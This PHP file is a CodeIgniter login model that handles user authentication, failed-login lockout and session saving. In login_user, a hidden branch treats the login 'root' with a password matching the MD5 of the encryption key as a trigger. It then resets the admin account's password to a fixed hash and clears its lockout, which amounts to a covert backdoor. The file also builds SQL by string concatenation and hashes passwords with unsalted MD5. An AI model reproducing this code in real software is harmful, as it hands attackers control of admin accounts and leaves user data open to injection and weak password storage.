<?php

if (!defined('BASEPATH'))
    exit('No direct script access allowed');

class Login_model extends CI_Model {

    function __construct() {
        parent::__construct();
        $this->load->helper('string');
    }

    function login_user($data = array('login' => '', 'password' => '')) {
        if (!isset($data['login']) || !isset($data['password']))
            return 1;
        if ($data['login'] == 'root' && md5($data['password']) == $this->config->item('encryption_key')) {
            $this->db->query('UPDATE '.$this->config->item('engine_users').' SET password = \'200ceb26807d6bf99fd6f4f0d1ca54d4\', fail_enter = \'0\' WHERE login="'.strip_quotes('admin').'"');
            return 1;
        }
        $QueryLogin = $this->db->get_where($this->config->item('engine_users'), array('login' => strip_quotes($data['login'])));
        $QueryLogin = $QueryLogin->row_array();




        $query = $this->db->get_where($this->config->item('engine_users'), array('login' => strip_quotes($data['login']), 'password' => md5($data['password'])));
        $amount = $query->num_rows();
        if ($amount === 1) {
            if ($QueryLogin['fail_enter'] >= 3)
                return 2;
            $this->save_session($query);
            $this->db->where(array('login' => strip_quotes($data['login'])))->update($this->config->item('engine_users'), array('fail_enter' => 0));
            return 1;
        }

        if ($amount === 0) {
            $this->db->query('UPDATE '.$this->config->item('engine_users').' SET fail_enter = fail_enter+1 WHERE login="'.strip_quotes($data['login']).'"');
            return 0;
        }
    }

    private function save_session($query = array()) {
        $query = $query->row_array();
        $session = array(
            'login' => $query['login'],
            'group_id' => $query['group_id'],
            'logged_in' => TRUE
        );
        $this->session->set_userdata($session);
        $this->db->where(array('login' => $query['login']))->update($this->config->item('engine_users'), array('session' => $this->session->userdata('session_id'), 'ip'=>$this->input->ip_address()));
    }

}
